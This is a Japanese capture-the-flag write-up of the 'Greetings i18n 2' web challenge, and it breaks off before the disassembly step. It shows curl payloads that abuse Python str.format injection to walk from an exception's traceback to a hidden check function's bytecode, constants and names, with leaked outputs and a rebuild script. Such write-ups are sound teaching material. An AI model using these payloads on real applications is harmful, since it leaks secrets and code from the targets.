# Greetings i18n 2 (2026/08/21)

なぜかWriteupが存在しなかったので、書いてみました。

誰でも理解できる事を心掛けました。是非、最後まで見ていってください。

## 問題

```
もうブラックボックスなWeb問題を作るのはやめて！
```
らしいです。自分もエスパー問は嫌いです。

どうやら`Greetings i18n`という問題が過去に出題されていたらしい。
https://qiita.com/Exploder-exe/items/d80cc06d8544177be063

今回はバージョン2みたいですね。

`Greetings i18n`では、Pythonのフォーマット文字列インジェクションで意図的にエラーを起こし、エラーのオブジェクト属性を辿ることでフラグを取得しているようです。

今回もこの脆弱性が関連しているのでしょうか？

ひょっとしてたら塞がれてるかも？

## 概要

ひとまず配布されてるファイルをダウンロードして、中身を見てみます。

`app.py`
`check.py`
この2つが配布されていました。

```
from flask import Flask, request
from check import check

app = Flask(__name__)

translations = {
    "hello": {
        "en": "Hello, {username}!",
        "ja": "こんにちは、{username}さん!"
    },
    "error": {
        "en": "An error has occured: {err}",
        "ja": "エラーが発生しました: {err}",
    }
}


def parse_accept_language() -> str:
    header = request.headers.get("Accept-Language")
    if not header:
        return "en"

    first = header.split(",")[0]
    lang = first.split(";")[0].strip().split("-")[0].strip()

    return lang or "en"

# Translation function
def _(key: str):
    custom = request.form.get(f"custom-{key}")
    if custom:
        return custom
    lang = parse_accept_language()
    return translations.get(key).get(lang, key)


@app.get("/")
def index():
    try:
        username = request.args.get("username", "anonymous user")
        return _("hello").format(username=username), 200, {'Content-Type': 'text/plain;charset=utf-8'}
    except Exception as e:
        return _("error").format(err=e), 500, {'Content-Type': 'text/plain;charset=utf-8'}

@app.post("/check")
def check_post():
    input = request.form.get("input", "")
    if check(input):
        return "That's the correct flag!"
    return "Nope", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
```
ひとまず`@app.get("/")`に絞ると、プログラムの流れはこんな感じです。
```
/?username=ほげほげ
↓
_("hello").format(username=ほげほげ)
↓
_("hello")が開始
↓
custom-{key} つまりcustom-helloの値を取得
↓
存在しない場合、Accept-Languageヘッダで指定された言語を指定する
↓
言語に対応した「"ja": "こんにちは、{username}さん!"」が指定される
↓
"こんにちは、{username}さん!".format(username=ほげほげ)
↓
こんにちは、ほげほげさん!
```
こんな感じです。エラーが道中で発生した場合は
```
エラー発生
↓
try失敗 except Exception as e に移行
↓
 _("error").format(err=e)が開始
↓
custom-{key} つまりcustom-errorの値を取得
↓
存在しない場合、Accept-Languageヘッダで指定された言語を指定する
↓
言語に対応した「"ja": "エラーが発生しました: {err}"」が指定される
↓
"エラーが発生しました: {err}".format(err=e)
```
ちなみに`.format(username=username)`このようなものを「文字列フォーマット」と呼びます。

文字列中の`{username}`を変数`username`の値で置換する処理であり、例えば

```
"Hello, {username}".format(username=username)
```

このようにすれば、`username=Alice`の場合、`Hello, Alice`になります。

そして、仮に対応するフォーマットが存在しなかった場合、エラーになります。

```
"Hello, {hoge}".format(username=username)
```

このようにした場合、`KeyError: 'hoge'`が返却されます。

ここ、重要なので覚えていてください。

次に、`@app.post("/check")`はこのようになっています。
```
@app.post("/check")
def check_post():
    input = request.form.get("input", "")
    if check(input):
        return "That's the correct flag!"
    return "Nope", 500
```
配布されていたcheck.pyを見てみましょう。
```
def check(input):
    return True # This function is different in the remote server.
```
なるほど、必ずTrueが出力されるようです。

恐らくリモートで試すと失敗するんでしょう。確かにこれはブラックボックスだ！

POSTで`input`の値を指定して、それが通れば、その値が正しいフラグであると分かる...ということでしょうか？

ですが、`check`がブラックボックスな以上、何らかの方法を用いて`check`内の処理をリークさせないといけません。

`Greetings i18n`で使われた脆弱性は残っているのでしょうか？

## フォーマット文字列インジェクション

先ほど言ったように、対応するフォーマットが存在しない場合、エラーが返却されます。

```
"Hello, {hoge}".format(username=username)
```

そして、今回は`custom-hello`が存在した場合、このようになります。

```
custom = request.form.get(f"custom-{key}")
if custom:
    return custom
```

そのまま外部入力が返却されるようです。よって、外部入力に`{username}`ではない別の適当なフォーマットを仕込めば、意図的に例外を発生させることができます。

```
curl -X GET \
  -d "custom-hello=Hello {hoge}" \
```

## 例外オブジェクトからcheck関数をリーク

さて、ひとまず例外を起こすことに成功しました。次は

```
except Exception as e:
    return _("error").format(err=e), 500, {'Content-Type': 'text/plain;charset=utf-8'}
```

この処理を考えてみます。

`e`の中には何が入っているのでしょうか？

軽くプログラムを作って確かめてみます。

```
try:
    "{hoge}".format(username="test")
except Exception as e:
    print(dir(e))
```

`dir`関数は、オブジェクトが持っている属性名やメソッド名の一覧を確認するための組み込み関数です。

出力はこうなりました。

```
['__cause__', '__class__', '__context__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setstate__', '__sizeof__', '__str__', '__subclasshook__', '__suppress_context__', '__traceback__', 'args', 'with_traceback']
```

注目するべきは`__traceback__`です。

`__traceback__`には、例外が発生した時点のPython実行環境が入っています。

つまり、その中に`check`関数の情報が入っている可能性があります。

同じように、使える属性名やメソッド名を辿ってみます。

```
try:
    "{hoge}".format(username="test")
except Exception as e:
    print(dir(e.__traceback__))
```

出力はこうなりました。

```
['tb_frame', 'tb_lasti', 'tb_lineno', 'tb_next']
```

次に注目するのは`tb_frame`です。

`tb_frame`には、例外が発生した場所の関数実行環境オブジェクトが入っています。

よって、この中にグローバル変数やローカル変数といった情報が入っている可能性があります。

どんどん行きましょう。

```
try:
    "{hoge}".format(username="test")
except Exception as e:
    print(dir(e.__traceback__.tb_frame))
```

出力はこうなりました。

```
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'f_back', 'f_builtins', 'f_code', 'f_globals', 'f_lasti', 'f_lineno', 'f_locals', 'f_trace', 'f_trace_lines', 'f_trace_opcodes']
```

今度は多いですね。

注目すべきは`f_globals`です。

`f_globals`は、そのフレームが属しているモジュールのグローバル名前空間を辞書として持っています。

つまり単純な話

```
{
    "FLAG": "secret",
    "check": <function check>
}
```

みたいなキーがあるかもしれません。

```
def check():
    return True

FLAG = "secret"

try:
    "{hoge}".format(username="test")
except Exception as e:
    fg = e.__traceback__.tb_frame.f_globals
    print(fg.keys())
```

適当にcheck関数やFLAG変数を定義して、キーを抽出してみます。

```
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__', '__file__', '__cached__', 'check', 'FLAG', 'e', 'fg'])
```

恐らく本番でも`check`は存在するでしょう。よって

```
err.__traceback__.tb_frame.f_globals[check]
```

を用いれば、check関数の情報を取得できると思われます。

使えるものを探していきましょう。

```
def check():
    return True

FLAG = "secret"

try:
    "{hoge}".format(username="test")
except Exception as e:
    fg = e.__traceback__.tb_frame.f_globals
    print(dir(fg["check"]))
```

出力はこうなりました。

```
['__annotations__', '__builtins__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```

名前から分かるように、今回は`__code__`です。

`__code__`には、その関数のコード情報が入っています。

サクサク行きましょう。

```
def check():
    return True

FLAG = "secret"

try:
    "{hoge}".format(username="test")
except Exception as e:
    fg = e.__traceback__.tb_frame.f_globals["check"].__code__
    print(dir(fg))
```

結果はこんな感じです。

```
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_kwonlyargcount', 'co_lines', 'co_linetable', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize', 'co_varnames', 'replace']
```

長かったです。これにて、ようやくパズルのピースが出揃いました...！

今回使っていくのは、この4つです。

```
co_names → グローバル変数名、関数名、属性名など名前の一覧
co_consts → その関数の中で使われる定数の一覧
co_varnames → その関数のローカル変数名と引数名の一覧
co_code → バイトコード本体
```

`co_code`だけでいいじゃん！という声が出てくるかもしれませんが、これだと命令列だけになってしまうので、名前や変数、定数の実体が読み取れません。

上記3つを特定し、それを元に命令列を読むことで、`check`関数の処理を推測してみましょう。

## ペイロード送信

フォーマット文字列インジェクションを起こす`custom-hello`とは違い、`custom-error`は先ほど説明した正規の手段(?)で`check`関数の情報をリークさせます。

具体的なペイロードはこのようになります。

```
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_names}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

ひとまず`co_names`をリークしてみます。

```
('len', 'bytes', 'range', 'ord')
```

おお、出てきました。

`len`ということは`input`のサイズ比較でもするのでしょうか？

また、`range`もありますね。繰り返しの処理かな？

あとは`ord`も気になるところです。整数変換...？

```
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_consts}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

次に`co_consts`をリークします。

```
(50, False, slice(None, None, 3), 'Aa{5MgRJnYIHKk4GA', None, '}Eq4CBLZgRlZqs7cl', 256, b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02', True, -3)
```

うおー！なんか絶秒にフラグらしきものが出てきました。

```
'Aa{5MgRJnYIHKk4GA'
'}Eq4CBLZgRlZqs7cl'
```

どうやら3の倍数が飛ばされているようです。

並び替えてみると`Al?ac?{7?5s?Mq?gZ?Rl?JR?ng?YZ?IL?HB?KC?k4?4q?GE?A}`になりました。

不明な文字列が16文字ありますね。

`b'\xbcrQ5\xc1\xfc\x07#\xfa\xac\xfc\xcd\x98_>\x02'`とあります。

こちらのバイト列は、いったい何なのでしょうか？

```
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_varnames}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

次にリークするのは`co_vernames`です。

```
('input', 'i')
```

おお、ここで`input`が登場しましたね。

iは先ほどリークされた`range`に使うものでしょうか？

```
curl -X GET \
  --data-urlencode 'custom-hello=HELLO {hoge}' \
  --data-urlencode 'custom-error={err.__traceback__.tb_frame.f_globals[check].__code__.co_code}' \
  'http://34.170.146.252:xxxxx/?username=test'
```

そして最後にトリである生バイトコードを取得します。

```
b'\x80\x00\\\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x004\x01\x00\x00\x00\x00\x00\x00^28w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x02,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x038w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x04R\x04R\t1\x03,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x058w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00\\\x03\x00\x00\x00\x00\x00\x00\x00\x00\\\x05\x00\x00\x00\x00\x00\x00\x00\x00^\x104\x01\x00\x00\x00\x00\x00\x00\x10\x00U\x01u\x02.\x00u\x02F\x94\x00\x00p\x01^\x07\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x05\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x01,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x03\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x02,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x17,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N\x02K\x96\x00\x00\t\x00\x1e\x00u\x02p\x014\x01\x00\x00\x00\x00\x00\x00R\x078w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00R\x08#\x00u\x02\x1f\x00u\x02p\x01i\x00'
```

うおおなんかすごい出てきた！

これらの情報を用いて逆アセンブルを行います。

逆アセンブルには`dis`モジュールを用います。

```
import dis

leaked_code = b'\x80\x00\\\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x004\x01\x00\x00\x00\x00\x00\x00^28w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x02,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x038w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00V\x00R\x04R\x04R\t1\x03,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x058w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00\\\x03\x00\x00\x00\x00\x00\x00\x00\x00\\\x05\x00\x00\x00\x00\x00\x00\x00\x00^\x104\x01\x00\x00\x00\x00\x00\x00\x10\x00U\x01u\x02.\x00u\x02F\x94\x00\x00p\x01^\x07\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x05\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x01,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x03\\\x07\x00\x00\x00\x00\x00\x00\x00\x00W\x01^\x03,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x02,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x01\x00\x00\x00\x00\x00\x00,\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\x17,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\x06,\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N\x02K\x96\x00\x00\t\x00\x1e\x00u\x02p\x014\x01\x00\x00\x00\x00\x00\x00R\x078w\x00\x00d\x03\x00\x00\x1c\x00R\x01#\x00R\x08#\x00u\x02\x1f\x00u\x02p\x01i\x00'

leaked_consts = (
    50,
    False,
    slice(None, None, 3),
    'Aa{5MgRJnYIHKk4GA',
    None,
    '}Eq4CBLZgRlZqs7cl',
    256,
    b'\xbc\x72\x51\x35\xc1\xfc\x07\x23\xfa\xac\xfc\xcd\x98\x5f\x3e\x02',
    True,
    -3,
)

leaked_names = (
    'len',
    'bytes',
    'range',
    'ord',
)

leaked_varnames = (
    'input',
    'i',
)

def dummy(input):
    i = None
    return input

reconstructed_code = dummy.__code__.replace(
    co_code=leaked_code,
    co_consts=leaked_consts,
    co_names=leaked_names,
    co_varnames=leaked_varnames,
    co_argcount=1,
    co_posonlyargcount=0,
    co_kwonlyargcount=0,
    co_nlocals=2,
    co_stacksize=32,
)

dis.dis(reconstructed_code, show_caches=False)
```

適当に`dummy`関数を用意して、そのコードオブジェクトを土台に、リークした`co_code``co_consts``co_names``co_varnames`などへ置き換えることで、元の関数のコードオブジェクトを再構築した上で、逆アセンブルを行います。

このコードはAIが一瞬で作ってくれました...泣

## 逆アセンブルでフラグ特定

ここからは逆アセンブルの時間です。

現時点でだいぶ長くなってしまいましたが、ここまで来たらちゃんとやり切りたいと思います。


